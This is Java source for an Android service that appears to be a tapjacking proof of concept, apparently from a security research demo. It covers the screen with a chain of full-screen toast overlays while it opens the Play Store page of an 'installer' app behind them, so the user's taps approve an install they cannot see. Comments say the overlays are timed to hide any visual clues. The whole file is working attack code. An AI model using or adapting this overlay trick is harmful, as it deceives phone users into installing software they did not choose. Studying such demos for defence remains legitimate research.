package com.nvisium.tapjacking;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Toast;

public class BackgroundInstallerService extends Service {

	@Override
	public IBinder onBind(Intent intent) {

		return null;
	}

	@Override
	public void onCreate() {

		super.onCreate();
		LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
		// create first toast
		Toast toast = Toast.makeText(getApplicationContext(), "",
				Toast.LENGTH_SHORT);
		View view = inflater.inflate(R.layout.installer_layout, null);
		toast.setView(view);
		toast.setGravity(Gravity.FILL, 0, 0);
	
		fireLongToast(toast);
		launchMarket();

	}

	// this link helped:
	// http://thinkandroid.wordpress.com/2010/02/19/indefinite-toast-hack/
	private void fireLongToast(final Toast toast) {

		Thread t = new Thread() {
			public void run() {
				int count = 0;
				int max_count = 10;
				try {
					while (true && count < max_count) {

						toast.show();
						/*
						 * We check to see when we are going to give the screen
						 * back. Right before our toasts end we swap activities
						 * to remove any visual clues
						 */
						if (count == max_count - 1) {
							ComponentName toLaunch;
							toLaunch = new ComponentName("com.nvisium.tapjacking",
									"com.nvisium.tapjacking.Main");
							Intent intent = new Intent();
							intent.addCategory(Intent.CATEGORY_LAUNCHER);
							intent.setComponent(toLaunch);
							intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
							getApplication().startActivity(intent);
						}

						/*
						 * this short sleep helps our toasts transition
						 * seamlessly
						 */
						sleep(1850);
						count++;
					}
				} catch (Exception e) {
				}

				stopSelf();

			}
		};
		t.start();
	}

	private void launchMarket() {
		Thread t = new Thread() {
			public void run() {
				/*
				 * We sleep first in order for the toasts to consume the screen
				 * before the dialer activity launches
				 */
				try {
					sleep(2000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				Intent intent = new Intent(Intent.ACTION_VIEW);
				intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				intent.setData(Uri
						.parse("market://details?id=com.nvisium.tapjacking.demo.installer"));
				getApplication().startActivity(intent);
			}
		};
		t.start();
	}
}
